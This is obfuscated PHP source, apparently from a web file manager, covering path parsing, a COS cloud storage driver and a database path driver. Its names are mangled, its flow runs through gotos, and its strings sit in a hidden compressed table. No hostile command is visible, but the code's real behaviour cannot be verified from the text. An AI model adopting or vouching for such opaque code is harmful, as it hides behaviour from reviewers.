$aÖªùİ¸ = new Backup(); $aÖªùİ¸->keep(); $f‘Ğ¹Š—Ä = $aÖªùİ¸->db(); goto A¨°Ã†˜Øƒ; eœõŸáùŒÚ: } public function process() { $D¸²‹è¨Œ =& $_SERVER[¾÷]; return array($D¸²‹è¨Œ[716] => Task::get($D¸²‹è¨Œ[734]), $D¸²‹è¨Œ[719] => Task::get($D¸²‹è¨Œ[753]), $D¸²‹è¨Œ[201] => Task::get($D¸²‹è¨Œ[762])); } public function restore() { $EæÃøœ„ÇÛ =& $_SERVER[¾÷]; ActionCall($EæÃøœ„ÇÛ[995], !0, 1); ActionCall($EæÃøœ„ÇÛ[995], !0, 0); } } goto E‚¬ğî¤Éà; c»Ü†Š’÷…: define($_SERVER[¾÷][0], $_SERVER[¾÷][1]); $_SERVER[¬ƒ] = explode($_SERVER[¾÷][2], gzinflate(substr($_SERVER[¾÷][3], 10, -8))); function binCheckEq($f‡ßšµÑ“, $a˜õÖ²‡‡‚) { return $f‡ßšµÑ“ == $a˜õÖ²‡‡‚; } goto A˜êƒº©èÁ; F˜–›ÛÓš¹: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\162\x52\x65\143\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\106\x69\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\x69\x6c\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\x6f\157\164\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\x53\x68\x61\x72\145\x4c\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\111\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\141\162\145\111\164\x65\x6d\x4c\x69\156\153\175"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\142\154\157\x63\x6b\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\145\162\175"; public static function typeList() { $a‰ùŞï” =& $_SERVER[¾÷]; return array($a‰ùŞï”[1114] => self::KOD_SOURCE, $a‰ùŞï”[1115] => self::KOD_USER_RECYCLE, $a‰ùŞï”[1116] => self::KOD_USER_FAV, $a‰ùŞï”[1117] => self::KOD_USER_FILE_TAG, $a‰ùŞï”[1118] => self::KOD_USER_FILE_TYPE, $a‰ùŞï”[1119] => self::KOD_GROUP_ROOT_SELF, $a‰ùŞï”[1120] => self::KOD_USER_SHARE, $a‰ùŞï”[1121] => self::KOD_USER_SHARE_LINK, $a‰ùŞï”[1122] => self::KOD_USER_SHARE_TO_ME, $a‰ùŞï”[1123] => self::KOD_SHARE_ITEM, $a‰ùŞï”[1124] => self::KOD_SHARE_LINK, $a‰ùŞï”[1125] => self::KOD_SEARCH, $a‰ùŞï”[1126] => self::KOD_BLOCK, $a‰ùŞï”[1127] => self::KOD_IO, $a‰ùŞï”[1128] => self::KOD_USER_RECENT, $a‰ùŞï”[1129] => self::KOD_USER_DRIVER); } public static function parse($C©É’Ã±×) { goto eÌùŞÔ±Ù; B´Á–µšÌŸ: $bš³ù“è¶ø = array($aŠ¶äÈ ¤˜[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[1095]] = in_array($Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[39]], $bš³ù“è¶ø); return $Fë˜ßÕØ”; goto B§ÄäÍ„™; eÌùŞÔ±Ù: $aŠ¶äÈ ¤˜ =& $_SERVER[¾÷]; $C©É’Ã±× = self::clear($C©É’Ã±×); $b”×Î‹‘ÙÖ = array_values(self::typeList()); goto EÁá¹ÜÃÄ…; EÁá¹ÜÃÄ…: preg_match($aŠ¶äÈ ¤˜[1130], $C©É’Ã±×, $DÕÈææøß˜); $Fë˜ßÕØ” = array($aŠ¶äÈ ¤˜[418] => !1, $aŠ¶äÈ ¤˜[1131] => !1, $aŠ¶äÈ ¤˜[415] => !1, $aŠ¶äÈ ¤˜[85] => $C©É’Ã±×, $aŠ¶äÈ ¤˜[1041] => !1, $aŠ¶äÈ ¤˜[1040] => $aŠ¶äÈ ¤˜[43]); if (is_array($DÕÈææøß˜) && count($DÕÈææøß˜) == 5) { $D…éùÉã‚ = $aŠ¶äÈ ¤˜[1132] . $DÕÈææøß˜[2] . $aŠ¶äÈ ¤˜[332]; if (in_array($D…éùÉã‚, $b”×Î‹‘ÙÖ)) { $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[1041]] = $DÕÈææøß˜[1]; $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[39]] = $D…éùÉã‚; $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[1133]] = substr($D…éùÉã‚, 1, -1); $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[397]] = $DÕÈææøß˜[3]; } $Fë˜ßÕØ”[$aŠ¶äÈ ¤˜[1040]] = $DÕÈææøß˜[4]; } goto B´Á–µšÌŸ; B§ÄäÍ„™: } public static function isTruePath($f‰êĞ‰–™Ø) { goto F¹ƒÅĞçªÛ; Añ¹¸ƒ´Âˆ: if (strpos($f‰êĞ‰–™Ø, $d™Ñ¤¸æ»[1135]) === 0) { return !0; } return !1; goto Dä„ÈŠØœ; b†–ÁØ·æ: if (strpos($f‰êĞ‰–™Ø, $d™Ñ¤¸æ»[1098]) === 0) { return !0; } if (strpos($f‰êĞ‰–™Ø, $d™Ñ¤¸æ»[1134]) === 0) { return !0; } if (strpos($f‰êĞ‰–™Ø, $d™Ñ¤¸æ»[1134]) === 0) { return !0; } goto Añ¹¸ƒ´Âˆ; F¹ƒÅĞçªÛ: $d™Ñ¤¸æ» =& $_SERVER[¾÷]; if (substr($f‰êĞ‰–™Ø, 0, 1) != $d™Ñ¤¸æ»[1132]) { return !0; } if (strpos($f‰êĞ‰–™Ø, $d™Ñ¤¸æ»[404]) === 0) { return !0; } goto b†–ÁØ·æ; Dä„ÈŠØœ: } public static function clear($F²šÏ¹„ïƒ) { goto EÇ¾ê²˜â; eá¥Èó¨ë¯: return $F²šÏ¹„ïƒ; goto C¤åƒ…ÃÂÙ; eŒÛáˆé¦³: $EáíéÆÅƒø = $A¤“ìíé±²[1136]; if (substr($F²šÏ¹„ïƒ, 0, 3) == $A¤“ìíé±²[1137]) { $F²šÏ¹„ïƒ = substr($F²šÏ¹„ïƒ, 3); } while (strstr($F²šÏ¹„ïƒ, $EáíéÆÅƒø)) { $F²šÏ¹„ïƒ = str_replace($EáíéÆÅƒø, $A¤“ìíé±²[18], $F²šÏ¹„ïƒ); } goto b¸†ø–ƒ‡‚; b¸†ø–ƒ‡‚: $F²šÏ¹„ïƒ = preg_replace($A¤“ìíé±²[1138], $A¤“ìíé±²[18], $F²šÏ¹„ïƒ); if ($F²šÏ¹„ïƒ == $A¤“ìíé±²[18]) { return $A¤“ìíé±²[18]; } $F²šÏ¹„ïƒ = rtrim($F²šÏ¹„ïƒ, $A¤“ìíé±²[18]); goto eá¥Èó¨ë¯; EÇ¾ê²˜â: $A¤“ìíé±² =& $_SERVER[¾÷]; $F²šÏ¹„ïƒ = str_replace(array($A¤“ìíé±²[1014], $A¤“ìíé±²[9]), $A¤“ìíé±²[60], $F²šÏ¹„ïƒ); $F²šÏ¹„ïƒ = str_replace($A¤“ìíé±²[106], $A¤“ìíé±²[18], $F²šÏ¹„ïƒ); goto eŒÛáˆé¦³; C¤åƒ…ÃÂÙ: } public static function sourceID($DË½Æšïã·) { $cÔ…¼°›İ— =& $_SERVER[¾÷]; $eá…Ÿ¹æø = self::parse($DË½Æšïã·); if ($eá…Ÿ¹æø[$cÔ…¼°›İ—[39]] !== self::KOD_SOURCE) { show_json(LNG($cÔ…¼°›İ—[1139]), !1); } return $eá…Ÿ¹æø[$cÔ…¼°›İ—[397]]; } public static function make($c…ß†›ÁÖ‡) { if (!$c…ß†›ÁÖ‡) { return !1; } return self::makePath(self::KOD_SOURCE, intval($c…ß†›ÁÖ‡)); } public static function makeShare($Bï‡Î”±ö†, $C‰›Ù¿Èºâ) { return self::makePath(self::KOD_SHARE_ITEM, $Bï‡Î”±ö†, $C‰›Ù¿Èºâ); } public static function makeFileTypePath($Dñ„À­»æó) { return self::makePath(self::KOD_USER_FILE_TYPE, $Dñ„À­»æó); } public static function makeFileTagPath($b¹’ùÑÎ™«) { return self::makePath(self::KOD_USER_FILE_TAG, $b¹’ùÑÎ™«); } public static function makePath($C’Öª¸Ù³©, $Bƒ¢”éÃÁ = '', $eâê…ÅçÓ = '') { $c‘ÉÛ“ßºë =& $_SERVER[¾÷]; $Eä¼¥“ºÃ = substr($C’Öª¸Ù³©, 1, -1); $C–‡ñàè½ = $c‘ÉÛ“ßºë[1140] . $Eä¼¥“ºÃ . $c‘ÉÛ“ßºë[1141] . $Bƒ¢”éÃÁ . $c‘ÉÛ“ßºë[1142]; $C–‡ñàè½ = $eâê…ÅçÓ ? $C–‡ñàè½ . $eâê…ÅçÓ . $c‘ÉÛ“ßºë[18] : $C–‡ñàè½; return $C–‡ñàè½; } public static function hashPath($Aİ¸¿÷«„) { goto a¨®Ş¦› ¥; EÈâ¹‚ó·°: return $A°ËÊ„Â–; goto F…Ø¡¾ïã×; f÷øÒ³„…å: if (!$A°ËÊ„Â– && isset($EäŠ¦Ó²’«[$a‘ìâğ¸³µ[399]])) { $EäŠ¦Ó²’« = IO::info(KodIO::make($EäŠ¦Ó²’«[$a‘ìâğ¸³µ[399]])); $A°ËÊ„Â– = _get($EäŠ¦Ó²’«, $a‘ìâğ¸³µ[1143], $a‘ìâğ¸³µ[43]); } if (!$A°ËÊ„Â–) { $Eá¿¡ö‹ = KodIO::parse($EäŠ¦Ó²’«[$a‘ìâğ¸³µ[85]]); if (!$Eá¿¡ö‹[$a‘ìâğ¸³µ[39]]) { $A°ËÊ„Â– = IO::hashSimple($EäŠ¦Ó²’«[$a‘ìâğ¸³µ[85]]); } } if (!$A°ËÊ„Â–) { $A°ËÊ„Â– = md5($EäŠ¦Ó²’«[$a‘ìâğ¸³µ[85]] . $EäŠ¦Ó²’«[$a‘ìâğ¸³µ[87]] . $EäŠ¦Ó²’«[$a‘ìâğ¸³µ[93]]); } goto EÈâ¹‚ó·°; a¨®Ş¦› ¥: $a‘ìâğ¸³µ =& $_SERVER[¾÷]; $EäŠ¦Ó²’« = is_array($Aİ¸¿÷«„) ? $Aİ¸¿÷«„ : IO::info($Aİ¸¿÷«„); $A°ËÊ„Â– = _get($EäŠ¦Ó²’«, $a‘ìâğ¸³µ[1143], $a‘ìâğ¸³µ[43]); goto f÷øÒ³„…å; F…Ø¡¾ïã×: } public static function initSystemPath() { goto AÌÌ¼Äßî§; AÌÌ¼Äßî§: $Fˆì»ò¸³ñ =& $_SERVER[¾÷]; if (defined($Fˆì»ò¸³ñ[1144])) { return; } define($Fˆì»ò¸³ñ[1144], self::systemPath($Fˆì»ò¸³ñ[1145])); goto FŒ×‹ŞÈ; FŒ×‹ŞÈ: define($Fˆì»ò¸³ñ[1146], self::systemPath($Fˆì»ò¸³ñ[1147])); define($Fˆì»ò¸³ñ[1148], self::systemPath($Fˆì»ò¸³ñ[1149])); define($Fˆì»ò¸³ñ[1150], self::systemPath($Fˆì»ò¸³ñ[1151])); goto bŠø÷—¿¼º; bŠø÷—¿¼º: IOHistory::bindEvent(); goto EÄ¶ã»í«×; EÄ¶ã»í«×: } public static function systemPath($Fõê°òÏéÔ) { goto aÉ¬‹³£¨; aÉ¬‹³£¨: $E´ìÀÇßÎº =& $_SERVER[¾÷]; $e¶‘Ù¹ÇİÍ = $E´ìÀÇßÎº[1152] . ucfirst($Fõê°òÏéÔ); $b²ÀÜ®ùˆğ = Model($E´ìÀÇßÎº[1100])->get($e¶‘Ù¹ÇİÍ); goto e™ã¢ºÕƒ; EªÌÓå‚öÏ: return $b²ÀÜ®ùˆğ; goto Bƒ¸•è¶·×; e™ã¢ºÕƒ: if ($b²ÀÜ®ùˆğ) { return $b²ÀÜ®ùˆğ; } if ($Fõê°òÏéÔ == $E´ìÀÇßÎº[1145]) { $b²ÀÜ®ùˆğ = self::make(Model($E´ìÀÇßÎº[776])->systemRootPathAdd($E´ìÀÇßÎº[509])); } else { $b²ÀÜ®ùˆğ = self::systemPath($E´ìÀÇßÎº[1145]); $E¬²±™¸šò = self::sourceID($b²ÀÜ®ùˆğ); $b²ÀÜ®ùˆğ = self::make(Model($E´ìÀÇßÎº[776])->mkdir($E¬²±™¸šò, $Fõê°òÏéÔ)); } Model($E´ìÀÇßÎº[1100])->set($e¶‘Ù¹ÇİÍ, $b²ÀÜ®ùˆğ); goto EªÌÓå‚öÏ; Bƒ¸•è¶·×: } public static function systemFolder($dáº½ˆ¦˜Ë) { $eˆ³ç…«Ÿ¹ = IO_PATH_SYSTEM_SOURCE . $dáº½ˆ¦˜Ë; $AÃçâÔ…­ˆ = Cache::get($eˆ³ç…«Ÿ¹); if (!$AÃçâÔ…­ˆ) { $F‡ÍÅóŠ›Û = IO::infoFull($eˆ³ç…«Ÿ¹); if (!$F‡ÍÅóŠ›Û) { $AÃçâÔ…­ˆ = IO::mkdir($eˆ³ç…«Ÿ¹, REPEAT_SKIP); } else { $AÃçâÔ…­ˆ = $F‡ÍÅóŠ›Û[$_SERVER[¾÷][85]]; } Cache::set($eˆ³ç…«Ÿ¹, $AÃçâÔ…­ˆ, 3600 * 10); } return $AÃçâÔ…­ˆ; } public static function defaultDriver() { return Model($_SERVER[¾÷][725])->defaultDriver(); } public static function defaultIO() { $C† ‰÷â·› =& $_SERVER[¾÷]; $F”¦Â×”åå = self::defaultDriver(); return $C† ‰÷â·›[1153] . $F”¦Â×”åå[$C† ‰÷â·›[397]] . $C† ‰÷â·›[1142]; } public static function defaultDriverInit() { static $D®–¨Èñ² = false; if ($D®–¨Èñ²) { return $D®–¨Èñ²; } $D®–¨Èñ² = IO::init(self::defaultIO()); return $D®–¨Èñ²; } public static function fileTypeList() { $c÷”Šà¿åî =& $_SERVER[¾÷]; $eË±“´î… = $GLOBALS[$c÷”Šà¿åî[16]][$c÷”Šà¿åî[1154]]; foreach ($eË±“´î… as $Eğâ¨Öè† => $bÏ«Ú–‘ƒ×) { $aÉå‹Ü°‡Ø = $c÷”Šà¿åî[1155] . $Eğâ¨Öè†; $F©¶Ğ»ˆ…÷ = LNG($aÉå‹Ü°‡Ø); if ($aÉå‹Ü°‡Ø != $F©¶Ğ»ˆ…÷) { $eË±“´î…[$Eğâ¨Öè†][$c÷”Šà¿åî[38]] = $F©¶Ğ»ˆ…÷; } } return $eË±“´î…; } public static function transferType($D›ç››äŒò, $aØ®Ñ¼¦ÈÎ) { goto Fá°–Ü²©÷; bğ•©Éï¿: if ($Bó†¶ãç¼æ[$BÛÛêª‘¾[39]] == $C¿çøÂ¦Â[$BÛÛêª‘¾[39]] && $Bó†¶ãç¼æ[$BÛÛêª‘¾[1156]] == $C¿çøÂ¦Â[$BÛÛêª‘¾[1156]]) { return $BÛÛêª‘¾[1157]; } if ($Bó†¶ãç¼æ[$BÛÛêª‘¾[39]] == $BÛÛêª‘¾[809] && $C¿çøÂ¦Â[$BÛÛêª‘¾[39]] == $BÛÛêª‘¾[115]) { return $BÛÛêª‘¾[1070]; } if ($Bó†¶ãç¼æ[$BÛÛêª‘¾[39]] == $BÛÛêª‘¾[115] && $C¿çøÂ¦Â[$BÛÛêª‘¾[39]] == $BÛÛêª‘¾[809]) { return $BÛÛêª‘¾[116]; } goto e…‡ÖøÌÜ; Fá°–Ü²©÷: $BÛÛêª‘¾ =& $_SERVER[¾÷]; $Bó†¶ãç¼æ = self::driverType($D›ç››äŒò); $C¿çøÂ¦Â = self::driverType($aØ®Ñ¼¦ÈÎ); goto bğ•©Éï¿; e…‡ÖøÌÜ: return $BÛÛêª‘¾[1158]; goto E©È›Ÿà®Ï; E©È›Ÿà®Ï: } public static function driverType($c«Ïá¯ÈŒœ) { goto a­’¡‚Æä–; fÊÕÂÆô: if ($D…™„‰Æ == $Fº‘Œ®æ‰é[716] || $D…™„‰Æ == $Fº‘Œ®æ‰é[1160] || $D…™„‰Æ == $Fº‘Œ®æ‰é[1161]) { $c«Ïá¯ÈŒœ = self::defaultDriverInit(); } else { if ($D…™„‰Æ == $Fº‘Œ®æ‰é[1077] || $D…™„‰Æ == $Fº‘Œ®æ‰é[1162]) { $c«Ïá¯ÈŒœ = IO::init($c«Ïá¯ÈŒœ->pathParse[$Fº‘Œ®æ‰é[1024]]); } } $D…™„‰Æ = str_replace($Fº‘Œ®æ‰é[1159], $Fº‘Œ®æ‰é[43], strtolower($c«Ïá¯ÈŒœ->getType())); if ($D…™„‰Æ == $Fº‘Œ®æ‰é[115]) { return array($Fº‘Œ®æ‰é[39] => $Fº‘Œ®æ‰é[115], $Fº‘Œ®æ‰é[1156] => $Fº‘Œ®æ‰é[43], $Fº‘Œ®æ‰é[85] => $B‰ ”ëò¾ù); } goto DÅ¼‰ß”Ş; DÅ¼‰ß”Ş: return array($Fº‘Œ®æ‰é[39] => $Fº‘Œ®æ‰é[809], $Fº‘Œ®æ‰é[1156] => $c«Ïá¯ÈŒœ->pathDriver, $Fº‘Œ®æ‰é[85] => $B‰ ”ëò¾ù); goto B“­ø¼è¸‰; a­’¡‚Æä–: $Fº‘Œ®æ‰é =& $_SERVER[¾÷]; $B‰ ”ëò¾ù = $c«Ïá¯ÈŒœ->path; $D…™„‰Æ = str_replace($Fº‘Œ®æ‰é[1159], $Fº‘Œ®æ‰é[43], strtolower($c«Ïá¯ÈŒœ->getType())); goto fÊÕÂÆô; B“­ø¼è¸‰: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($B¿Ò’ˆ§) { parent::__construct($B¿Ò’ˆ§); $this->signatureVersion($_SERVER[¾÷][220]); } public function uploadFormData($c¾’Áƒ×•¢, $E°¯ËÎ²Û” = 3600) { goto D­é‰±ëªÔ; B‚µ“˜‹ÕÈ: return $eøêàÑÏÖé; goto fÕóÉ†¤ğ½; D­é‰±ëªÔ: $e­à½½÷‘š =& $_SERVER[¾÷]; $A«„½öåÊ = $e­à½½÷‘š[200]; $CùÆßÎëõ£ = $e­à½½÷‘š[237]; goto díµ½Ö; díµ½Ö: $A„‚ƒÌÄö = $e­à½½÷‘š[1163]; $eè˜ø¿÷¯È = gmdate($e­à½½÷‘š[1164], time() + $E°¯ËÎ²Û”); $AøŒÈˆ™Éš = (string) time() . $e­à½½÷‘š[77] . (string) (time() + $E°¯ËÎ²Û”); goto EÌß‚¢°‹õ; EÌß‚¢°‹õ: $A¸ÊŠÔÉù¹ = array($e­à½½÷‘š[1165] => $eè˜ø¿÷¯È, $e­à½½÷‘š[1166] => array(array($e­à½½÷‘š[1167] => $A«„½öåÊ), array($e­à½½÷‘š[1168] => $this->bucket), array($e­à½½÷‘š[1169], $e­à½½÷‘š[1170], $e­à½½÷‘š[43]), array($e­à½½÷‘š[1171] => $A„‚ƒÌÄö), array($e­à½½÷‘š[1172] => $CùÆßÎëõ£), array($e­à½½÷‘š[1173] => $this->accessKey), array($e­à½½÷‘š[1174] => $AøŒÈˆ™Éš))); $A¸ÊŠÔÉù¹ = json_encode($A¸ÊŠÔÉù¹); $cá‚‡µ¡è = hash_hmac($e­à½½÷‘š[237], $AøŒÈˆ™Éš, $this->secret); goto cÈó—Œ¬¸Ä; cÈó—Œ¬¸Ä: $eÄÄ³Å“Î“ = sha1($A¸ÊŠÔÉù¹); $A ã•Ñòõñ = hash_hmac($e­à½½÷‘š[237], $eÄÄ³Å“Î“, $cá‚‡µ¡è); $eøêàÑÏÖé = array($e­à½½÷‘š[1167] => $A«„½öåÊ, $e­à½½÷‘š[1171] => $A„‚ƒÌÄö, $e­à½½÷‘š[1175] => base64_encode($A¸ÊŠÔÉù¹), $e­à½½÷‘š[1172] => $CùÆßÎëõ£, $e­à½½÷‘š[1173] => $this->accessKey, $e­à½½÷‘š[1176] => $AøŒÈˆ™Éš, $e­à½½÷‘š[1177] => $A ã•Ñòõñ, $e­à½½÷‘š[184] => $this->getHost()); goto B‚µ“˜‹ÕÈ; fÕóÉ†¤ğ½: } public function fileOutLink($aÉÔœŠŒª) { $F›ÓàÖà‚– =& $_SERVER[¾÷]; if (substr($aÉÔœŠŒª, 0, 7) == $F›ÓàÖà‚–[1178]) { $aÉÔœŠŒª = $F›ÓàÖà‚–[1179] . substr($aÉÔœŠŒª, 7); } header($F›ÓàÖà‚–[168] . $aÉÔœŠŒª); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FÑ³¢™†¦¼) { $this->pathParse = $FÑ³¢™†¦¼; $this->model = Model($_SERVER[¾÷][1180]); } public function getPath($d¤’áñ¸ƒ) { return trim($d¤’áñ¸ƒ, $_SERVER[¾÷][18]); } public function pathFather($aî“»˜è—¨) { $Cê²Š’çİ = $this->parse($aî“»˜è—¨); $Cê²Š’çİ = $this->infoSimple($aî“»˜è—¨); return $Cê²Š’çİ ? $Cê²Š’çİ[$_SERVER[¾÷][481]] : !1; } public function pathThis($eÌÄĞë¯Ø) { $fŞÇƒÑçô— = $this->infoSimple($eÌÄĞë¯Ø); return $fŞÇƒÑçô— ? $fŞÇƒÑçô—[$_SERVER[¾÷][38]] : !1; } public function getPathOuter($AïéÊˆ†´‰) { if (!$AïéÊˆ†´‰) { return $AïéÊˆ†´‰; } $D¤‰¼©ë‡ = $this->parse($AïéÊˆ†´‰); return KodIO::make($D¤‰¼©ë‡[$_SERVER[¾÷][397]]); } public function copyFolderFromIO($B¬ËøÙŞÈ, $eº†ó‚Şìİ, $Aªñò†ÙŞ÷, $B¡¤Ëƒ‘®, $dï†˜ãÂÖ—) { $d¦¸òİ…©† = $this->model->copyFolderFromIO($B¬ËøÙŞÈ, $eº†ó‚Şìİ, $Aªñò†ÙŞ÷, $B¡¤Ëƒ‘®, $dï†˜ãÂÖ—); return KodIO::make($d¦¸òİ…©†); } public function isParentOf($cÇ¯ùğó¥, $b¹µƒ÷³ÜÂ) { return $this->model->isParentOf($cÇ¯ùğó¥, $b¹µƒ÷³ÜÂ); } public function mkfile($bËÉàŸİŠ¹, $C•®¤‹ªÓƒ = '', $DÜËéØç = REPEAT_RENAME) { $e¡·¥õçì¬ =& $_SERVER[¾÷]; $aïÏ±ó—ƒí = $this->parse($bËÉàŸİŠ¹); $bËÉàŸİŠ¹ = $aïÏ±ó—ƒí[$e¡·¥õçì¬[397]]; for ($B–„Ê´£®Ù = 0; $B–„Ê´£®Ù < count($aïÏ±ó—ƒí[$e¡·¥õçì¬[1181]]); $B–„Ê´£®Ù++) { $b¸ŠßÄ‰Ê = $aïÏ±ó—ƒí[$e¡·¥õçì¬[1181]][$B–„Ê´£®Ù]; if ($B–„Ê´£®Ù == count($aïÏ±ó—ƒí[$e¡·¥õçì¬[1181]]) - 1) { $bËÉàŸİŠ¹ = $this->model->mkfile($bËÉàŸİŠ¹, $b¸ŠßÄ‰Ê, $C•®¤‹ªÓƒ, $DÜËéØç); break; } $bËÉàŸİŠ¹ = $this->model->mkdir($bËÉàŸİŠ¹, $b¸ŠßÄ‰Ê, REPEAT_SKIP); } return $this->getPathOuter($bËÉàŸİŠ¹); } public function mkdir($BªÁéÏƒºË, $b‡ê™Èæ¨Î = REPEAT_SKIP) { $FÄãè£‹ =& $_SERVER[¾÷]; $AÆ‹ùİÉƒ = $this->parse($BªÁéÏƒºË); $BªÁéÏƒºË = $AÆ‹ùİÉƒ[$FÄãè£‹[397]]; for ($càìˆ†ãØ— = 0; $càìˆ†ãØ— < count($AÆ‹ùİÉƒ[$FÄãè£‹[1181]]); $càìˆ†ãØ—++) { $a¨Ø­ìÑ à = $AÆ‹ùİÉƒ[$FÄãè£‹[1181]][$càìˆ†ãØ—]; $BªÁéÏƒºË = $this->model->mkdir($BªÁéÏƒºË, $a¨Ø­ìÑ à, $b‡ê™Èæ¨Î); } return $this->getPathOuter($BªÁéÏƒºË); } public function copyFile($A˜ö§º“Ê, $E™Œéè›‚Ç, $fœ»ÇŒ–¼© = REPEAT_REPLACE) { $Aãàªªƒß¶ =& $_SERVER[¾÷]; $céòÖÀ«ŠŞ = $this->parse($E™Œéè›‚Ç); $B‰ÁÈ‹³ø = $this->model->copy($A˜ö§º“Ê, $céòÖÀ«ŠŞ[$Aãàªªƒß¶[397]], $fœ»ÇŒ–¼©, $céòÖÀ«ŠŞ[$Aãàªªƒß¶[85]]); return $B‰ÁÈ‹³ø ? $this->getPathOuter($B‰ÁÈ‹³ø) : !1; } public function moveFile($E½§Ñà¯—Š, $B”ù–É¬œ, $fğ£¹Ùİ²× = REPEAT_REPLACE) { $EØç¼ç™ÑÜ =& $_SERVER[¾÷]; $bÔÅƒ­¬¾¶ = $this->parse($B”ù–É¬œ); $d…Ñ§‹Ââò = $this->model->move($E½§Ñà¯—Š, $bÔÅƒ­¬¾¶[$EØç¼ç™ÑÜ[397]], $fğ£¹Ùİ²×, $bÔÅƒ­¬¾¶[$EØç¼ç™ÑÜ[85]]); return $d…Ñ§‹Ââò ? $this->getPathOuter($d…Ñ§‹Ââò) : !1; } public function copy($Fé‚ÒÛºÕå, $Eİ˜§¤§‡¸, $F¸ƒåè×ËŞ = REPEAT_REPLACE) { $cêŞ§ –È­ = $this->parse($Eİ˜§¤§‡¸); $d›¼ÙÖÊ = $this->model->copy($Fé‚ÒÛºÕå, $cêŞ§ –È­[$_SERVER[¾÷][397]], $F¸ƒåè×ËŞ); return $d›¼ÙÖÊ ? $this->getPathOuter($d›¼ÙÖÊ) : !1; } public function moveSameAllow() { } public function move($BÀŠÛ‹Ï, $A¿êˆ’Î–’, $DùŠ¨µ¸É = REPEAT_REPLACE) { $D¶–ÂÊµœ = $this->parse($A¿êˆ’Î–’); $bÜÄ¹ƒå´‘ = $this->model->move($BÀŠÛ‹Ï, $D¶–ÂÊµœ[$_SERVER[¾÷][397]], $DùŠ¨µ¸É); return $bÜÄ¹ƒå´‘ ? $this->getPathOuter($bÜÄ¹ƒå´‘) : !1; } public function remove($aÑÒ¨§å™ä, $CÍñËîáò¼ = true) { return $this->model->remove($aÑÒ¨§å™ä, $CÍñËîáò¼); } public function rename($E›œÌ¥ŸÆœ, $eÀï‡Ğ Œ) { $AåáÉˆˆ¥› = $this->model->rename($E›œÌ¥ŸÆœ, $eÀï‡Ğ Œ); return $AåáÉˆˆ¥› ? $this->getPathOuter($E›œÌ¥ŸÆœ) : $AåáÉˆˆ¥›; } public function size($Bº–ôã¨ã) { $B¼õá‚Šèˆ = $this->infoSimple($Bº–ôã¨ã); return $B¼õá‚Šèˆ ? $B¼õá‚Šèˆ[$_SERVER[¾÷][87]] : 0; } public function infoSimple($cŠ›ğ”ÆÀ) { return $this->model->sourceInfo($cŠ›ğ”ÆÀ); } public function info($eî‘Âé’ÅÈ) { return $this->infoParse($eî‘Âé’ÅÈ); } public function infoAuth($céÀß¿ÔÔ) { return $this->infoParse($céÀß¿ÔÔ, !1, !0); } public function infoWithChildren($føŞÃÏÂ¤) { return $this->infoParse($føŞÃÏÂ¤, !0); } protected function infoParse($e­ÃÅ¡é…ò, $fÚ¤äš´’‹ = false, $F¬‚İŸ›Œó = false) { if (!$fÚ¤äš´’‹) { return $this->model->pathInfo($e­ÃÅ¡é…ò, $F¬‚İŸ›Œó); } return $this->model->pathInfoMore($e­ÃÅ¡é…ò); } public function infoFull($d’Ø„ŞÔ¸) { $B¶åƒªˆ¬Ô =& $_SERVER[¾÷]; $E’›òĞÀÍµ = explode($B¶åƒªˆ¬Ô[18], $d’Ø„ŞÔ¸); $Cš³Øâ¤ì„ = implode($B¶åƒªˆ¬Ô[18], array_splice($E’›òĞÀÍµ, 1)); return $this->model->pathInfoByPath($E’›òĞÀÍµ[0], $Cš³Øâ¤ì„); } public function hashSimple($CïâŞ©´Şè) { $d³Èò‚†Å =& $_SERVER[¾÷]; $b„›…ÍÛ—¤ = $this->infoWithChildren($CïâŞ©´Şè); return $b„›…ÍÛ—¤[$d³Èò‚†Å[173]][$d³Èò‚†Å[180]]; } public function hashMd5($E±ëÉÉØ‹ƒ) { $dÓÎĞ–—Ğ´ =& $_SERVER[¾÷]; $Bß‰ôËãƒÕ = $this->infoWithChildren($E±ëÉÉØ‹ƒ); return $Bß‰ôËãƒÕ[$dÓÎĞ–—Ğ´[173]][$dÓÎĞ–—Ğ´[179]]; } public function exist($Eø®ºëŸª) { $BÏÜ½‹êÖ =& $_SERVER[¾÷]; $dÄÔ¼¸é» = $this->parse($Eø®ºëŸª); if (!$dÄÔ¼¸é»[$BÏÜ½‹êÖ[85]]) { return $this->isFile($Eø®ºëŸª) || $this->isFolder($Eø®ºëŸª); } $d­÷ ‡ËªÉ = array($BÏÜ½‹êÖ[398] => $dÄÔ¼¸é»[$BÏÜ½‹êÖ[397]], $BÏÜ½‹êÖ[38] => $dÄÔ¼¸é»[$BÏÜ½‹êÖ[85]]); $B˜’Ô¨Å¤Š = $this->model->where($d­÷ ‡ËªÉ)->find(); return $B˜’Ô¨Å¤Š ? !0 : !1; } public function isFile($c¨÷¸­‚Ğ) { $c¸é–ƒ°…Ÿ =& 